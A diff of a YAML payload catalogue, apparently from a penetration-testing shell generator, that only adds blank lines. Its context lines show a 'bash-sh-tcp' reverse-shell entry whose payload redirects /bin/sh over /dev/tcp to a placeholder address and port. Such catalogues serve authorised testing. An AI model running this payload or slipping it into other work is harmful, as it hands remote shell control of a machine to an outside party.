@@ -13,6 +13,7 @@ specification:
 ### Items
 ###
 items:
+
   - name: bash-sh-tcp
     desc: TCP reverse shell with bash|sh|zsh initiated from within a bash shell
     info:
@@ -36,6 +37,7 @@ items:
       command: /bin/sh
     payload: |
       bash -c '/bin/sh>&/dev/tcp/__ADDR__/__PORT__ 0>&1'
+
 
   - name: bash-sh-tcp
     desc: TCP reverse shell with bash|sh|zsh initiated from within a bash shell
